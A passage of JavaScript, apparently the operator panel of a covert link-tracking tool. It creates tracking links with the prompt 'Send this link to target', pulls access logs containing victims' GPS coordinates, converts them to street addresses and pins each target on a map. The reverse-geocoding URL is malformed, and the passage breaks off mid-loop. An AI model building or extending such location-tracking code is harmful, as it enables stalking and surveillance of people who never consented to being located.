        // Native, localized pipeline assembly
        const _supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        let map, marker;

        function initMap(lat = 0, lon = 0, zoom = 2) {
            if (typeof L === 'undefined') return;
            if (map) {
                map.setView([lat, lon], zoom);
                return;
            }
            map = L.map('map').setView([lat, lon], zoom);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        }

        async function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Build absolute direct API payload dispatch to bypass client core library layers
            try {
                const res = await fetch(`${SUPABASE_URL}/auth/v1/token?grant_type=password`, {
                    method: 'POST',
                    headers: {
                        'apikey': SUPABASE_ANON_KEY,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ email, password })
                });
                
                const data = await res.json();
                
                if (!res.ok) {
                    alert("Access Denied: " + (data.error_description || data.error || "Invalid Credentials"));
                    return;
                }

                // Store token context in application cache
                window.sessionStorage.setItem('sb_token', data.access_token);

                document.getElementById('auth-section').classList.add('hidden');
                document.getElementById('main-section').classList.remove('hidden');
                initMap();
                fetchLogs();
            } catch(e) {
                alert("Database direct portal block: Verify internet link or device data connection.");
            }
        }

        async function createLink() {
            const token = document.getElementById('token').value;
            const destination_url = document.getElementById('dest').value;
            const jwt = window.sessionStorage.getItem('sb_token');

            const res = await fetch(`${SUPABASE_URL}/rest/v1/tracking_links`, {
                method: 'POST',
                headers: {
                    'apikey': SUPABASE_ANON_KEY,
                    'Authorization': `Bearer ${jwt}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                },
                body: JSON.stringify({ token, destination_url })
            });

            if (!res.ok) {
                const err = await res.json();
                alert("Creation Error: " + err.message);
            } else {
                const currentOrigin = window.location.origin;
                document.getElementById('output-link').innerText = `Send this link to target: ${currentOrigin}/target.html?c=${token}`;
            }
        }

        async function getStreetAddress(lat, lon) {
            if (!lat || !lon) return "No GPS Data Available";
            try {
                const res = await fetch(`https://openstreetmap.org{lat}&lon=${lon}`);
                const data = await res.json();
                return data.display_name || "Address structural index failure";
            } catch (e) {
                return "Address API offline";
            }
        }

        async function focusTargetOnMap(lat, lon, label) {
            initMap(lat, lon, 16);
            if (marker && map) map.removeLayer(marker);
            if (map) marker = L.marker([lat, lon]).addTo(map).bindPopup(label).openPopup();
        }

        async function fetchLogs() {
            const jwt = window.sessionStorage.getItem('sb_token');
            const res = await fetch(`${SUPABASE_URL}/rest/v1/access_logs?select=*&order=timestamp.desc`, {
                method: 'GET',
                headers: {
                    'apikey': SUPABASE_ANON_KEY,
                    'Authorization': `Bearer ${jwt}`
                }
            });

            if (!res.ok) return;
            const logs = await res.json();

            const tbody = document.getElementById('log-table-body');
            tbody.innerHTML = "";

            for (let log of logs) {
                const tr = document.createElement('tr');
                const hasGPS = log.gps_latitude && log.gps_longitude;
